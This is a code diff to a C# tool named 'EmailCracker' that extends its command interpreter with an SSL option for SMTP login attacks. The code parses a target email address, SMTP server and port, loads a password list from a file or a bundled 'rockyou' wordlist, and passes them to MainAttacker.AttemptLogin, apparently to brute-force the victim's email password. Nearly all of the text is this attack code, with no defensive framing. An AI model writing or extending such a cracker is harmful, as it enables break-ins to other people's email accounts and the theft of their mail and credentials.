@@ -13,6 +13,7 @@ namespace EmailCracker
     {
         public static void CommandInterpreter(string cmd)
         {
+            bool ssl = false;
             string[] cmd_words = cmd.Split(' ');
             if(cmd_words.Length >= 2)
             {
@@ -25,7 +26,68 @@ namespace EmailCracker
                     string smtp = cmd_words[1].ToLower();
                     if(cmd_words.Length >= 3)
                     {
-                        if(Int32.TryParse(cmd_words[2], out int port) && port == 465 || port == 587 || port == 25 || port == 2525)
+                        if(cmd_words[2].ToLower() == "-s")
+                        {
+                            ssl = true;
+                            if(Int32.TryParse(cmd_words[3], out int port) && port == 465 || port == 587 || port == 25 || port == 2525)
+                            {
+                                if(cmd_words.Length >= 5)
+                                {
+                                    if(IsValidEmail(cmd_words[4]))
+                                    {
+                                        string target = cmd_words[4];
+                                        if(cmd_words.Length >= 6)
+                                        {
+                                            string sub_task = cmd_words[5];
+                                            string[] passwords = new string[0];
+                                            if(sub_task.ToUpper() == "-P")
+                                            {
+                                                if(cmd_words.Length >= 7)
+                                                {
+                                                    if(File.Exists(cmd_words[6]))
+                                                    {
+                                                        passwords = File.ReadAllLines(cmd_words[6]);
+                                                        bool verbose = false;
+                                                        if(cmd_words.Length >= 8)
+                                                        {
+                                                            if(cmd_words[7].ToLower() == "-v")
+                                                                verbose = true;
+                                                        }
+                                                        MainAttacker.AttemptLogin(smtp, port, target, passwords, verbose, ssl);
+                                                    }
+                                                    else
+                                                        ThrowErr($"Invlid filepath [{cmd}]");
+                                                }
+                                                else
+                                                    ThrowErr($"Invlid syntax [{cmd}]");
+                                            }
+                                            else if(sub_task.ToLower() == "--p")
+                                            {
+                                                passwords = WebSploit.Properties.Resources.rockyou.Split('\n');
+                                                bool verbose = false;
+                                                if(cmd_words.Length >= 7)
+                                                {
+                                                    if(cmd_words[6].ToLower() == "-v")
+                                                        verbose = true;
+                                                }
+                                                MainAttacker.AttemptLogin(smtp, port, target, passwords, verbose, ssl);
+                                            }
+                                            else
+                                                ThrowErr($"Invlid syntax [{cmd}]");
+                                        }
+                                        else
+                                            ThrowErr($"Invlid syntax [{cmd}]");
+                                    }
+                                    else
+                                        ThrowErr($"Invlid email address [{cmd}]");
+                                }
+                                else
+                                    ThrowErr($"Invlid syntax [{cmd}]");
+                            }
+                            else
+                                ThrowErr($"Invlid SMTP port [{cmd}]");
+                        }
+                        else if(Int32.TryParse(cmd_words[2], out int port) && port == 465 || port == 587 || port == 25 || port == 2525)
                         {
                             if(cmd_words.Length >= 4)
                             {
@@ -49,7 +111,7 @@ namespace EmailCracker
                                                         if(cmd_words[6].ToLower() == "-v")
                                                             verbose = true;
                                                     }
-                                                    MainAttacker.AttemptLogin(smtp, port, target, passwords, verbose);
+                                                    MainAttacker.AttemptLogin(smtp, port, target, passwords, verbose, ssl);
                                                 }
                                                 else
                                                     ThrowErr($"Invlid filepath [{cmd}]");
@@ -66,7 +128,7 @@ namespace EmailCracker
                                                 if(cmd_words[5].ToLower() == "-v")
                                                     verbose = true;
                                             }
-                                            MainAttacker.AttemptLogin(smtp, port, target, passwords, verbose);
+                                            MainAttacker.AttemptLogin(smtp, port, target, passwords, verbose, ssl);
                                         }
                                         else
                                             ThrowErr($"Invlid syntax [{cmd}]");
